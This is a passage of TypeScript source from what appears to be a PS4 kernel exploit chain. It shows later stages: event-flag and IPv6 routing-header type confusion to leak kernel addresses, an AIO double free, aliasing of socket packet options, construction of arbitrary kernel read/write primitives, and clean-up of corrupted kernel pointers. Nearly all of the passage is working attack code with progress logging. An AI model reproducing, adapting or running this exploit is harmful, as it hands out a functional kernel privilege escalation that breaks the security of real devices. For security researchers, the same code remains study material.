    close(sd_listen)
    return null
  } catch (e) {
    log('Stage 1 error: ' + (e as Error).message)
    return null
  }
}

// Stage 2
function new_evf (name: BigInt, flags: number) {
  const result = evf_create(name, 0, flags)
  if (result.eq(new BigInt(0xFFFFFFFF, 0xFFFFFFFF))) {
    throw new Error('evf_create error: ' + hex(result))
  }
  return result
}

function set_evf_flags (id: BigInt, flags: number) {
  let result = evf_clear(id, 0)
  if (result.eq(new BigInt(0xFFFFFFFF, 0xFFFFFFFF))) {
    throw new Error('evf_clear error: ' + hex(result))
  }
  result = evf_set(id, flags)
  if (result.eq(new BigInt(0xFFFFFFFF, 0xFFFFFFFF))) {
    throw new Error('evf_set error: ' + hex(result))
  }
  return result
}

function free_evf (id: BigInt) {
  const result = evf_delete(id)
  if (result.eq(new BigInt(0xFFFFFFFF, 0xFFFFFFFF))) {
    throw new Error('evf_delete error: ' + hex(result))
  }
  return result
}

function verify_reqs2 (addr: BigInt, cmd: number) {
  if (read32(addr) !== cmd) {
    return false
  }

  const heap_prefixes = []

  for (let i = 0x10; i <= 0x20; i += 8) {
    if (read16(addr.add(i + 6)) !== 0xffff) {
      return false
    }
    heap_prefixes.push(Number(read16(addr.add(i + 4))))
  }

  const state1 = Number(read32(addr.add(0x38)))
  const state2 = Number(read32(addr.add(0x3c)))
  if (!(state1 > 0 && state1 <= 4) || state2 !== 0) {
    return false
  }

  if (!read64(addr.add(0x40)).eq(0)) {
    return false
  }

  for (let i = 0x48; i <= 0x50; i += 8) {
    if (read16(addr.add(i + 6)) === 0xffff) {
      if (read16(addr.add(i + 4)) !== 0xffff) {
        heap_prefixes.push(Number(read16(addr.add(i + 4))))
      }
    } else if (i === 0x50 || !read64(addr.add(i)).eq(0)) {
      return false
    }
  }

  if (heap_prefixes.length < 2) {
    return false
  }

  const first_prefix = heap_prefixes[0]
  for (let idx = 1; idx < heap_prefixes.length; idx++) {
    if (heap_prefixes[idx] !== first_prefix) {
      return false
    }
  }

  return true
}

function leak_kernel_addrs (sd_pair: [BigInt, BigInt], sds: BigInt[]) {
  const sd = sd_pair[0]
  const buflen = 0x80 * LEAK_LEN
  const buf = malloc(buflen)

  log('Confusing evf with rthdr...')

  const name = malloc(1)

  close(sd_pair[1])

  let evf: BigInt | null = null
  for (let i = 1; i <= NUM_ALIAS; i++) {
    const evfs = []

    for (let j = 1; j <= NUM_HANDLES; j++) {
      const evf_flags = 0xf00 | (j << 16)
      evfs.push(new_evf(name, evf_flags))
    }

    get_rthdr(sd, buf, 0x80)

    const flag = read32(buf)

    if ((flag & 0xf00) === 0xf00) {
      const idx = (flag >>> 16) & 0xffff
      const expected_flag = (flag | 1)

      evf = evfs[idx - 1]!

      set_evf_flags(evf, expected_flag)
      get_rthdr(sd, buf, 0x80)

      const val = read32(buf)
      if (val === expected_flag) {
        evfs.splice(idx - 1, 1)
      } else {
        evf = null
      }
    }

    for (let k = 0; k < evfs.length; k++) {
      if (evf === null || evfs[k] !== evf) {
        free_evf(evfs[k]!)
      }
    }

    if (evf !== null) {
      log('Confused rthdr and evf at attempt: ' + i)
      break
    }
  }

  if (evf === null) {
    log('Failed to confuse evf and rthdr')
    return null
  }

  set_evf_flags(evf, 0xff00)

  const kernel_addr = read64(buf.add(0x28))
  log('"evf cv" string addr: ' + hex(kernel_addr))

  const kbuf_addr = read64(buf.add(0x40)).sub(0x38) // -0x38
  log('Kernel buffer addr: ' + hex(kbuf_addr))

  const wbufsz = 0x80
  const wbuf = malloc(wbufsz)
  const rsize = build_rthdr(wbuf, wbufsz)
  const marker_val = 0xdeadbeef
  const reqs3_offset = 0x10

  write32(wbuf.add(4), marker_val)
  write32(wbuf.add(reqs3_offset + 0), 1)                  // .ar3_num_reqs
  write32(wbuf.add(reqs3_offset + 4), 0)                  // .ar3_reqs_left
  write32(wbuf.add(reqs3_offset + 8), AIO_STATE_COMPLETE) // .ar3_state
  write8(wbuf.add(reqs3_offset + 0xc), 0)                // .ar3_done
  write32(wbuf.add(reqs3_offset + 0x28), 0x67b0000)       // .ar3_lock.lock_object.lo_flags
  write64(wbuf.add(reqs3_offset + 0x38), 1)               // .ar3_lock.lk_lock = LK_UNLOCKED

  const num_elems = 6
  const ucred = kbuf_addr.add(4)
  const leak_reqs = make_reqs1(num_elems)
  write64(leak_reqs.add(0x10), ucred)

  const num_loop = NUM_SDS
  const leak_ids_len = num_loop * num_elems
  const leak_ids = malloc(4 * leak_ids_len)
  const step = (4 * num_elems)
  const cmd = AIO_CMD_WRITE | AIO_CMD_FLAG_MULTI

  let reqs2_off: number | null = null
  let fake_reqs3_off: number | null = null
  let fake_reqs3_sd: BigInt | null = null

  for (let i = 1; i <= NUM_LEAKS; i++) {
    for (let j = 1; j <= num_loop; j++) {
      write32(wbuf.add(8), j)
      aio_submit_cmd(cmd, leak_reqs, num_elems, 3, new BigInt(Number(leak_ids) + ((j - 1) * step)))
      set_rthdr(sds[j - 1]!, wbuf, rsize)
    }

    get_rthdr(sd, buf, buflen)

    let sd_idx: number | null = null
    reqs2_off = null
    fake_reqs3_off = null

    for (let off = 0x80; off < buflen; off += 0x80) {
      const offset = off

      if (reqs2_off === null && verify_reqs2(buf.add(offset), AIO_CMD_WRITE)) {
        reqs2_off = off
      }

      if (fake_reqs3_off === null) {
        const marker = read32(buf.add(offset + 4))
        if (marker === marker_val) {
          fake_reqs3_off = off
          sd_idx = Number(read32(buf.add(offset + 8)))
        }
      }
    }

    if (reqs2_off !== null && fake_reqs3_off !== null && sd_idx !== null) {
      log('Found reqs2 and fake reqs3 at attempt: ' + i)
      fake_reqs3_sd = sds[sd_idx - 1]!
      sds.splice(sd_idx - 1, 1)
      free_rthdrs(sds)
      sds.push(new_socket())
      break
    }

    free_aios(leak_ids, leak_ids_len)
  }

  if (reqs2_off === null || fake_reqs3_off === null) {
    log('Could not leak reqs2 and fake reqs3')
    return null
  }

  log('reqs2 offset: ' + hex(reqs2_off))
  log('fake reqs3 offset: ' + hex(fake_reqs3_off))

  get_rthdr(sd, buf, buflen)

  log('Leaked aio_entry:')

  let leak_str = ''
  for (let i = 0; i < 0x80; i += 8) {
    if (i % 16 === 0 && i !== 0) leak_str += '\n'
    leak_str += hex(read64(buf.add(reqs2_off + i))) + ' '
  }
  log(leak_str)

  const aio_info_addr = read64(buf.add(reqs2_off + 0x18))
  const reqs1_addr = read64(buf.add(reqs2_off + 0x10)).and(new BigInt(0xFFFFFFFF, 0xFFFFFF00))
  const fake_reqs3_addr = kbuf_addr.add(fake_reqs3_off + reqs3_offset)

  log('reqs1_addr = ' + hex(reqs1_addr))
  log('fake_reqs3_addr = ' + hex(fake_reqs3_addr))

  log('Searching for target_id...')

  let target_id: number | null = null
  let to_cancel: BigInt | null = null
  let to_cancel_len: number | null = null

  const errors = malloc(4 * num_elems)

  for (let i = 0; i < leak_ids_len; i += num_elems) {
    aio_multi_cancel(new BigInt(Number(leak_ids) + (i * 4)), num_elems, errors)
    get_rthdr(sd, buf, buflen)

    const state = read32(buf.add(reqs2_off + 0x38))
    if (state === AIO_STATE_ABORTED) {
      target_id = read32(leak_ids.add(i * 4))
      write32(leak_ids.add(i * 4), 0)

      log('Found target_id=' + hex(target_id) + ', i=' + i + ', batch=' + Math.floor(i / num_elems))

      const start = i + num_elems
      to_cancel = new BigInt(Number(leak_ids) + start * 4)
      to_cancel_len = leak_ids_len - start

      break
    }
  }

  if (target_id === null) {
    log('Target ID not found')

    return null
  }

  if (to_cancel === null || to_cancel_len === null) {
    log('to_cancel not set')

    return null
  }

  cancel_aios(to_cancel, to_cancel_len)
  free_aios2(leak_ids, leak_ids_len)

  log('Kernel addresses leaked successfully!')

  return {
    reqs1_addr,
    kbuf_addr,
    kernel_addr,
    target_id,
    evf,
    fake_reqs3_addr,
    fake_reqs3_sd,
    aio_info_addr
  }
}

// IPv6 kernel r/w primitive
const ipv6_kernel_rw: {
  data: {
    pipe_read_fd?: BigInt
    pipe_write_fd?: BigInt
    pipe_addr?: BigInt
    pipemap_buffer?: BigInt
    read_mem?: BigInt
    master_target_buffer?: BigInt
    slave_buffer?: BigInt
    pktinfo_size_store?: BigInt
    master_sock?: BigInt
    victim_sock?: BigInt
  }
  ofiles: BigInt | null
  kread8: ((kaddr: BigInt) => BigInt) | null
  kwrite8: ((kaddr: BigInt, value: BigInt) => void) | null
  init: (ofiles: BigInt, kread8: (kaddr: BigInt) => BigInt, kwrite8: (kaddr: BigInt, value: BigInt) => void) => void
  get_fd_data_addr: (fd: BigInt) => BigInt
  create_pipe_pair: () => void
  create_overlapped_ipv6_sockets: () => void
  ipv6_write_to_victim: (kaddr: BigInt) => void
  ipv6_kread: (kaddr: BigInt, buffer_addr: BigInt) => void
  ipv6_kwrite: (kaddr: BigInt, buffer_addr: BigInt) => void
  ipv6_kread8: (kaddr: BigInt) => BigInt
  copyout: (kaddr: BigInt, uaddr: BigInt, len: BigInt) => void
  copyin: (uaddr: BigInt, kaddr: BigInt, len: BigInt) => void
  read_buffer: (kaddr: BigInt, len: number) => Uint8Array
  write_buffer: (kaddr: BigInt, buffer: Uint8Array) => void
} = {
  data: {},
  ofiles: null,
  kread8: null,
  kwrite8: null,
  init: function (ofiles: BigInt, kread8: (kaddr: BigInt) => BigInt, kwrite8: (kaddr: BigInt, value: BigInt) => void) {
    ipv6_kernel_rw.ofiles = ofiles
    ipv6_kernel_rw.kread8 = kread8
    ipv6_kernel_rw.kwrite8 = kwrite8

    ipv6_kernel_rw.create_pipe_pair()
    ipv6_kernel_rw.create_overlapped_ipv6_sockets()
  },
  get_fd_data_addr: function (fd: BigInt) {
    if (!kernel_offset?.SIZEOF_OFILES) {
      throw new Error('kernel_offset not initialized')
    }
    if (!ipv6_kernel_rw.ofiles || !ipv6_kernel_rw.kread8) {
      throw new Error('ipv6_kernel_rw not initialized')
    }
    // PS4: ofiles is at offset 0x0, each entry is 0x8 bytes

    // Just in case fd is a bigint
    const fdNum = Number(fd)

    const filedescent_addr = ipv6_kernel_rw.ofiles.add(fdNum * kernel_offset.SIZEOF_OFILES)
    const file_addr = ipv6_kernel_rw.kread8(filedescent_addr.add(0x0))
    return ipv6_kernel_rw.kread8(file_addr.add(0x0))
  },
  create_pipe_pair: function () {
    const pipe = create_pipe()
    const read_fd = pipe[0]!
    const write_fd = pipe[1]!

    ipv6_kernel_rw.data.pipe_read_fd = read_fd
    ipv6_kernel_rw.data.pipe_write_fd = write_fd
    ipv6_kernel_rw.data.pipe_addr = ipv6_kernel_rw.get_fd_data_addr(read_fd)
    ipv6_kernel_rw.data.pipemap_buffer = malloc(0x14)
    ipv6_kernel_rw.data.read_mem = malloc(PAGE_SIZE)
  },
  create_overlapped_ipv6_sockets: function () {
    if (!kernel_offset?.SO_PCB || !kernel_offset?.INPCB_PKTOPTS) {
      throw new Error('kernel_offset not initialized')
    }
    if (!ipv6_kernel_rw.kread8 || !ipv6_kernel_rw.kwrite8) {
      throw new Error('ipv6_kernel_rw not initialized')
    }
    const master_target_buffer = malloc(0x14)
    const slave_buffer = malloc(0x14)
    const pktinfo_size_store = malloc(0x8)

    write64(pktinfo_size_store, 0x14)

    const master_sock = socket(AF_INET6, SOCK_DGRAM, IPPROTO_UDP)
    const victim_sock = socket(AF_INET6, SOCK_DGRAM, IPPROTO_UDP)

    setsockopt(master_sock, IPPROTO_IPV6, IPV6_PKTINFO, master_target_buffer, 0x14)
    setsockopt(victim_sock, IPPROTO_IPV6, IPV6_PKTINFO, slave_buffer, 0x14)

    const master_so = ipv6_kernel_rw.get_fd_data_addr(master_sock)
    const master_pcb = ipv6_kernel_rw.kread8(master_so.add(kernel_offset.SO_PCB))
    const master_pktopts = ipv6_kernel_rw.kread8(master_pcb.add(kernel_offset.INPCB_PKTOPTS))

    const slave_so = ipv6_kernel_rw.get_fd_data_addr(victim_sock)
    const slave_pcb = ipv6_kernel_rw.kread8(slave_so.add(kernel_offset.SO_PCB))
    const slave_pktopts = ipv6_kernel_rw.kread8(slave_pcb.add(kernel_offset.INPCB_PKTOPTS))

    ipv6_kernel_rw.kwrite8(master_pktopts.add(0x10), slave_pktopts.add(0x10))

    ipv6_kernel_rw.data.master_target_buffer = master_target_buffer
    ipv6_kernel_rw.data.slave_buffer = slave_buffer
    ipv6_kernel_rw.data.pktinfo_size_store = pktinfo_size_store
    ipv6_kernel_rw.data.master_sock = master_sock
    ipv6_kernel_rw.data.victim_sock = victim_sock
  },
  ipv6_write_to_victim: function (kaddr: BigInt) {
    if (!ipv6_kernel_rw.data.master_target_buffer || !ipv6_kernel_rw.data.master_sock) {
      throw new Error('ipv6_kernel_rw not initialized')
    }
    write64(ipv6_kernel_rw.data.master_target_buffer, kaddr)
    write64(ipv6_kernel_rw.data.master_target_buffer.add(0x8), 0)
    write32(ipv6_kernel_rw.data.master_target_buffer.add(0x10), 0)
    setsockopt(ipv6_kernel_rw.data.master_sock, IPPROTO_IPV6, IPV6_PKTINFO, ipv6_kernel_rw.data.master_target_buffer, 0x14)
  },
  ipv6_kread: function (kaddr: BigInt, buffer_addr: BigInt) {
    if (!ipv6_kernel_rw.data.victim_sock || !ipv6_kernel_rw.data.pktinfo_size_store) {
      throw new Error('ipv6_kernel_rw not initialized')
    }
    ipv6_kernel_rw.ipv6_write_to_victim(kaddr)
    getsockopt(ipv6_kernel_rw.data.victim_sock, IPPROTO_IPV6, IPV6_PKTINFO, buffer_addr, ipv6_kernel_rw.data.pktinfo_size_store)
  },
  ipv6_kwrite: function (kaddr: BigInt, buffer_addr: BigInt) {
    if (!ipv6_kernel_rw.data.victim_sock) {
      throw new Error('ipv6_kernel_rw not initialized')
    }
    ipv6_kernel_rw.ipv6_write_to_victim(kaddr)
    setsockopt(ipv6_kernel_rw.data.victim_sock, IPPROTO_IPV6, IPV6_PKTINFO, buffer_addr, 0x14)
  },
  ipv6_kread8: function (kaddr: BigInt) {
    if (!ipv6_kernel_rw.data.slave_buffer) {
      throw new Error('ipv6_kernel_rw not initialized')
    }
    ipv6_kernel_rw.ipv6_kread(kaddr, ipv6_kernel_rw.data.slave_buffer)
    return read64(ipv6_kernel_rw.data.slave_buffer)
  },
  copyout: function (kaddr: BigInt, uaddr: BigInt, len: BigInt) {
    if (kaddr === null || kaddr === undefined ||
          uaddr === null || uaddr === undefined ||
          len === null || len === undefined || len.eq(0)) {
      throw new Error('copyout: invalid arguments')
    }
    if (!ipv6_kernel_rw.data.pipe_read_fd || !ipv6_kernel_rw.data.pipemap_buffer || !ipv6_kernel_rw.data.pipe_addr) {
      throw new Error('ipv6_kernel_rw not initialized')
    }

    write64(ipv6_kernel_rw.data.pipemap_buffer, new BigInt(0x40000000, 0x40000000))
    write64(ipv6_kernel_rw.data.pipemap_buffer.add(0x8), new BigInt(0x40000000, 0x00000000))
    write32(ipv6_kernel_rw.data.pipemap_buffer.add(0x10), 0)
    ipv6_kernel_rw.ipv6_kwrite(ipv6_kernel_rw.data.pipe_addr, ipv6_kernel_rw.data.pipemap_buffer)

    write64(ipv6_kernel_rw.data.pipemap_buffer, kaddr)
    write64(ipv6_kernel_rw.data.pipemap_buffer.add(0x8), 0)
    write32(ipv6_kernel_rw.data.pipemap_buffer.add(0x10), 0)
    ipv6_kernel_rw.ipv6_kwrite(ipv6_kernel_rw.data.pipe_addr.add(0x10), ipv6_kernel_rw.data.pipemap_buffer)

    read(ipv6_kernel_rw.data.pipe_read_fd, uaddr, len)
  },
  copyin: function (uaddr: BigInt, kaddr: BigInt, len: BigInt) {
    if (kaddr === null || kaddr === undefined ||
          uaddr === null || uaddr === undefined ||
          len === null || len === undefined || len.eq(0)) {
      throw new Error('copyin: invalid arguments')
    }
    if (!ipv6_kernel_rw.data.pipemap_buffer || !ipv6_kernel_rw.data.pipe_addr || !ipv6_kernel_rw.data.pipe_write_fd) {
      throw new Error('ipv6_kernel_rw not initialized')
    }

    write64(ipv6_kernel_rw.data.pipemap_buffer, 0)
    write64(ipv6_kernel_rw.data.pipemap_buffer.add(0x8), new BigInt(0x40000000, 0x00000000))
    write32(ipv6_kernel_rw.data.pipemap_buffer.add(0x10), 0)
    ipv6_kernel_rw.ipv6_kwrite(ipv6_kernel_rw.data.pipe_addr, ipv6_kernel_rw.data.pipemap_buffer)

    write64(ipv6_kernel_rw.data.pipemap_buffer, kaddr)
    write64(ipv6_kernel_rw.data.pipemap_buffer.add(0x8), 0)
    write32(ipv6_kernel_rw.data.pipemap_buffer.add(0x10), 0)
    ipv6_kernel_rw.ipv6_kwrite(ipv6_kernel_rw.data.pipe_addr.add(0x10), ipv6_kernel_rw.data.pipemap_buffer)

    write(ipv6_kernel_rw.data.pipe_write_fd, uaddr, len)
  },
  read_buffer: function (kaddr: BigInt, len: number) {
    if (!ipv6_kernel_rw.data.read_mem) {
      throw new Error('ipv6_kernel_rw not initialized')
    }
    let mem = ipv6_kernel_rw.data.read_mem
    if (len > PAGE_SIZE) {
      mem = malloc(len)
    }

    ipv6_kernel_rw.copyout(kaddr, mem, new BigInt(len))
    return read_buffer(mem, len)
  },
  write_buffer: function (kaddr: BigInt, buf: Uint8Array) {
    const temp_addr = malloc(buf.length)
    write_buffer(temp_addr, buf)
    ipv6_kernel_rw.copyin(temp_addr, kaddr, new BigInt(buf.length))
  }
}

function read_buffer (addr: BigInt, len: number) {
  const buffer = new Uint8Array(len)
  for (let i = 0; i < len; i++) {
    buffer[i] = Number(read8(addr.add(i)))
  }
  return buffer
}

function read_cstring (addr: BigInt) {
  let str = ''
  let i = 0
  while (true) {
    const c = Number(read8(addr.add(i)))
    if (c === 0) break
    str += String.fromCharCode(c)
    i++
    if (i > 256) break // Safety limit
  }
  return str
}

function write_buffer (addr: BigInt, buffer: Uint8Array) {
  for (let i = 0; i < buffer.length; i++) {
    write8(addr.add(i), buffer[i]!)
  }
}

function make_aliased_pktopts (sds: BigInt[]): [BigInt, BigInt] | null {
  const tclass = malloc(4)

  for (let loop = 0; loop < NUM_ALIAS; loop++) {
    for (let i = 0; i < sds.length; i++) {
      write32(tclass, i)
      set_sockopt(sds[i]!, IPPROTO_IPV6, IPV6_TCLASS, tclass, 4)
    }

    for (let i = 0; i < sds.length; i++) {
      get_sockopt(sds[i]!, IPPROTO_IPV6, IPV6_TCLASS, tclass, 4)
      const marker = Number(read32(tclass))

      if (marker !== i) {
        const sd_pair: [BigInt, BigInt] = [sds[i]!, sds[marker]!]
        log('Aliased pktopts at attempt ' + loop + ' (pair: ' + sd_pair[0] + ', ' + sd_pair[1] + ')')
        if (marker > i) {
          sds.splice(marker, 1)
          sds.splice(i, 1)
        } else {
          sds.splice(i, 1)
          sds.splice(marker, 1)
        }

        for (let j = 0; j < 2; j++) {
          const sock_fd = new_socket()
          set_sockopt(sock_fd, IPPROTO_IPV6, IPV6_TCLASS, tclass, 4)
          sds.push(sock_fd)
        }

        return sd_pair
      }
    }

    for (let i = 0; i < sds.length; i++) {
      set_sockopt(sds[i]!, IPPROTO_IPV6, IPV6_2292PKTOPTIONS, new BigInt(0), 0)
    }
  }

  return null
}

function double_free_reqs1 (reqs1_addr: BigInt, target_id: number, evf: BigInt, sd: BigInt, sds: BigInt[], sds_alt: BigInt[], fake_reqs3_addr: BigInt) {
  const max_leak_len = (0xff + 1) << 3
  const buf = malloc(max_leak_len)

  const num_elems = MAX_AIO_IDS
  const aio_reqs = make_reqs1(num_elems)

  const num_batches = 1
  const aio_ids_len = num_batches * num_elems
  const aio_ids = malloc(4 * aio_ids_len)

  log('Overwriting rthdr with AIO queue entry...')
  let aio_not_found = true
  free_evf(evf)

  for (let i = 0; i < NUM_CLOBBERS; i++) {
    spray_aio(num_batches, aio_reqs, num_elems, aio_ids, true)

    const size_ret = get_rthdr(sd, buf, max_leak_len)
    const cmd = read32(buf)

    if (size_ret === 8 && cmd === AIO_CMD_READ) {
      log('Aliased at attempt ' + i)
      aio_not_found = false
      cancel_aios(aio_ids, aio_ids_len)
      break
    }

    free_aios(aio_ids, aio_ids_len, true)
  }

  if (aio_not_found) {
    log('Failed to overwrite rthdr')
    return null
  }

  const reqs2_size = 0x80
  const reqs2 = malloc(reqs2_size)
  const rsize = build_rthdr(reqs2, reqs2_size)

  write32(reqs2.add(4), 5)                   // ar2_ticket
  write64(reqs2.add(0x18), reqs1_addr)       // ar2_info
  write64(reqs2.add(0x20), fake_reqs3_addr)  // ar2_batch

  const states = malloc(4 * num_elems)
  const addr_cache: BigInt[] = []
  for (let i = 0; i < num_batches; i++) {
    addr_cache.push(aio_ids.add(i * num_elems * 4))
  }

  log('Overwriting AIO queue entry with rthdr...')

  close(sd)

  function overwrite_aio_entry_with_rthdr () {
    for (let i = 0; i < NUM_ALIAS; i++) {
      for (let j = 0; j < sds.length; j++) {
        set_rthdr(sds[j]!, reqs2, rsize)
      }
      // log("before for batch = 0 ...")
      for (let batch = 0; batch < addr_cache.length; batch++) {
        for (let j = 0; j < num_elems; j++) {
          write32(states.add(j * 4), 0xFFFFFFFF)
        }

        aio_multi_cancel_fun(addr_cache[batch]!, num_elems, states)

        let req_idx = -1
        for (let j = 0; j < num_elems; j++) {
          const val = read32(states.add(j * 4))
          if (val === AIO_STATE_COMPLETE) {
            req_idx = j
            break
          }
        }

        if (req_idx !== -1) {
          log('Found req_id at batch ' + batch + ', attempt ' + i)
          const aio_idx = batch * num_elems + req_idx
          const req_id_p = aio_ids.add(aio_idx * 4)
          const req_id = read32(req_id_p)

          aio_multi_poll_fun(req_id_p, 1, states)
          write32(req_id_p, 0)
          return req_id
        }
      }
    }

    return null
  }

  const req_id = overwrite_aio_entry_with_rthdr()
  if (req_id === null) {
    log('Failed to overwrite AIO queue entry')
    return null
  }

  free_aios2(aio_ids, aio_ids_len)

  const target_id_p = malloc(4)
  write32(target_id_p, target_id)

  aio_multi_poll_fun(target_id_p, 1, states)

  const sce_errs = malloc(8)
  write32(sce_errs, 0xFFFFFFFF) // -1
  write32(sce_errs.add(4), 0xFFFFFFFF) // -1

  const target_ids = malloc(8)
  write32(target_ids, req_id)
  write32(target_ids.add(4), target_id)

  log('Triggering double free...')
  aio_multi_delete_fun(target_ids, 2, sce_errs)

  log('Reclaiming memory...')

  const sd_pair = make_aliased_pktopts(sds_alt)

  const err1 = read32(sce_errs)
  const err2 = read32(sce_errs.add(4))

  write32(states, 0xFFFFFFFF) // -1
  write32(states.add(4), 0xFFFFFFFF) // -1

  aio_multi_poll_fun(target_ids, 2, states)

  let success = true
  if (read32(states) !== SCE_KERNEL_ERROR_ESRCH) {
    log('ERROR: Bad delete of corrupt AIO request')
    success = false
  }

  if (err1 !== 0 || err1 !== err2) {
    log('ERROR: Bad delete of ID pair')
    success = false
  }

  if (!success) {
    log('Double free failed')
    return null
  }

  if (sd_pair === null) {
    log('Failed to make aliased pktopts')
    return null
  }

  return sd_pair
}

// Stage 4

function make_kernel_arw (pktopts_sds: BigInt[], reqs1_addr: BigInt, kernel_addr: BigInt, sds: BigInt[], sds_alt: BigInt[], aio_info_addr: BigInt) {
  try {
    const kernelOffset = kernel_offset
    if (!kernelOffset) {
      throw new Error('kernel_offset not initialized')
    }
    const master_sock = pktopts_sds[0]!
    const tclass = malloc(4)
    const off_tclass = kernelOffset.IP6PO_TCLASS!

    const pktopts_size = 0x100
    const pktopts = malloc(pktopts_size)
    const rsize = build_rthdr(pktopts, pktopts_size)
    const pktinfo_p = reqs1_addr.add(0x10)

    // pktopts.ip6po_pktinfo = &pktopts.ip6po_pktinfo
    write64(pktopts.add(0x10), pktinfo_p)

    log('Overwriting main pktopts')
    let reclaim_sock = null

    close(pktopts_sds[1]!)

    for (let i = 1; i <= NUM_ALIAS; i++) {
      for (let j = 0; j < sds_alt.length; j++) {
        write32(pktopts.add(off_tclass), 0x4141 | (j << 16))
        set_rthdr(sds_alt[j]!, pktopts, rsize)
      }

      get_sockopt(master_sock, IPPROTO_IPV6, IPV6_TCLASS, tclass, 4)
      const marker = read32(tclass)
      if ((marker & 0xffff) === 0x4141) {
        log('Found reclaim socket at attempt: ' + i)
        const idx = Number(marker >> 16)
        reclaim_sock = sds_alt[idx]
        sds_alt.splice(idx, 1)
        break
      }
    }

    if (reclaim_sock === null) {
      log('Failed to overwrite main pktopts')
      return null
    }

    const pktinfo_len = 0x14
    const pktinfo = malloc(pktinfo_len)
    write64(pktinfo, pktinfo_p)

    const read_buf = malloc(8)

    const slow_kread8 = (addr: BigInt) => {
      const len = 8
      let offset = 0

      while (offset < len) {
        // pktopts.ip6po_nhinfo = addr + offset
        write64(pktinfo.add(8), addr.add(offset))

        set_sockopt(master_sock, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo, pktinfo_len)
        const n = get_sockopt(master_sock, IPPROTO_IPV6, IPV6_NEXTHOP, read_buf.add(offset), len - offset)

        if (n === 0) {
          write8(read_buf.add(offset), 0)
          offset = offset + 1
        } else {
          offset = offset + Number(n)
        }
      }

      return read64(read_buf)
    }

    const test_read = slow_kread8(kernel_addr)
    log('slow_kread8("evf cv"): ' + hex(test_read))
    const kstr = read_cstring(read_buf)
    log('*("evf cv"): ' + kstr)

    if (kstr !== 'evf cv') {
      log('Test read of "evf cv" failed')
      return null
    }

    log('Slow arbitrary kernel read achieved')

    // Get curproc from previously freed aio_info
    const curproc = slow_kread8(aio_info_addr.add(8))

    if (Number(curproc.shr(48)) !== 0xffff) {
      log('Invalid curproc kernel address: ' + hex(curproc))
      return null
    }

    const possible_pid = Number(slow_kread8(curproc.add(kernelOffset.PROC_PID!)))
    const current_pid = Number(getpid())

    if ((possible_pid & 0xffffffff) !== (current_pid & 0xffffffff)) {
      log('curproc verification failed: ' + hex(curproc))
      return null
    }

    log('curproc = ' + hex(curproc))

    kernel.addr.curproc = curproc
    kernel.addr.curproc_fd = slow_kread8((kernel.addr.curproc).add(kernelOffset.PROC_FD!))
    kernel.addr.curproc_ofiles = slow_kread8(kernel.addr.curproc_fd).add(kernelOffset.FILEDESC_OFILES!)
    kernel.addr.inside_kdata = kernel_addr

    const get_fd_data_addr = (sock: BigInt, kread8_fn: (addr: BigInt) => BigInt | null) => {
      const filedescent_addr = (kernel.addr.curproc_ofiles!).add(Number(sock) * kernelOffset.SIZEOF_OFILES!)
      const file_addr = kread8_fn(filedescent_addr.add(0))!
      return kread8_fn(file_addr.add(0))!
    }

    const get_sock_pktopts = (sock: BigInt, kread8_fn: (addr: BigInt) => BigInt | null) => {
      const fd_data = get_fd_data_addr(sock, kread8_fn)
      const pcb = kread8_fn(fd_data.add(kernelOffset.SO_PCB!))!
      const pktopts = kread8_fn(pcb.add(kernelOffset.INPCB_PKTOPTS!))!
      return pktopts
    }

    const worker_sock = new_socket()
    const worker_pktinfo = malloc(pktinfo_len)

    // Create pktopts on worker_sock
    set_sockopt(worker_sock, IPPROTO_IPV6, IPV6_PKTINFO, worker_pktinfo, pktinfo_len)

    const worker_pktopts = get_sock_pktopts(worker_sock, slow_kread8)

    write64(pktinfo, worker_pktopts.add(0x10))   // overlap pktinfo
    write64(pktinfo.add(8), 0)                   // clear .ip6po_nexthop

    set_sockopt(master_sock, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo, pktinfo_len)

    const kread20 = (addr: BigInt, buf: BigInt) => {
      write64(pktinfo, addr)
      set_sockopt(master_sock, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo, pktinfo_len)
      get_sockopt(worker_sock, IPPROTO_IPV6, IPV6_PKTINFO, buf, pktinfo_len)
    }

    const kwrite20 = (addr: BigInt, buf: BigInt) => {
      write64(pktinfo, addr)
      set_sockopt(master_sock, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo, pktinfo_len)
      set_sockopt(worker_sock, IPPROTO_IPV6, IPV6_PKTINFO, buf, pktinfo_len)
    }

    const kread8 = (addr: BigInt) => {
      kread20(addr, worker_pktinfo)
      return read64(worker_pktinfo)
    }

    // Note: this will write our 8 bytes + remaining 12 bytes as null
    const restricted_kwrite8 = (addr: BigInt, val: BigInt) => {
      write64(worker_pktinfo, val)
      write64(worker_pktinfo.add(8), 0)
      write32(worker_pktinfo.add(16), 0)
      kwrite20(addr, worker_pktinfo)
    }

    write64(read_buf, kread8(kernel_addr))

    const kstr2 = read_cstring(read_buf)
    if (kstr2 !== 'evf cv') {
      log('Test read of "evf cv" failed')
      return null
    }

    log('Restricted kernel r/w achieved')

    // Initialize ipv6_kernel_rw with restricted write
    ipv6_kernel_rw.init(kernel.addr.curproc_ofiles, kread8, restricted_kwrite8)

    kernel.read_buffer = ipv6_kernel_rw.read_buffer
    kernel.write_buffer = ipv6_kernel_rw.write_buffer
    kernel.copyout = ipv6_kernel_rw.copyout
    kernel.copyin = ipv6_kernel_rw.copyin

    const kstr3 = kernel.read_null_terminated_string(kernel_addr)
    if (kstr3 !== 'evf cv') {
      log('Test read of "evf cv" failed')
      return null
    }

    log('Arbitrary kernel r/w achieved!')

    // RESTORE: clean corrupt pointers
    const off_ip6po_rthdr = kernelOffset.IP6PO_RTHDR!

    for (let i = 0; i < sds.length; i++) {
      const sock_pktopts = get_sock_pktopts(sds[i]!, kernel.read_qword)
      kernel.write_qword(sock_pktopts.add(off_ip6po_rthdr), 0)
    }

    const reclaimer_pktopts = get_sock_pktopts(reclaim_sock!, kernel.read_qword)

    kernel.write_qword(reclaimer_pktopts.add(off_ip6po_rthdr), 0)
    kernel.write_qword(worker_pktopts.add(off_ip6po_rthdr), 0)

    const sock_increase_ref = [
      ipv6_kernel_rw.data.master_sock!,
      ipv6_kernel_rw.data.victim_sock!,
      master_sock,
      worker_sock,
      reclaim_sock!
    ]

    // Increase ref counts to prevent deallocation
    for (const each of sock_increase_ref) {
      const sock_addr = get_fd_data_addr(each, kernel.read_qword)
      kernel.write_dword(sock_addr.add(0x0), 0x100)  // so_count
    }

    log('Fixes applied')

    return true
  } catch (e) {
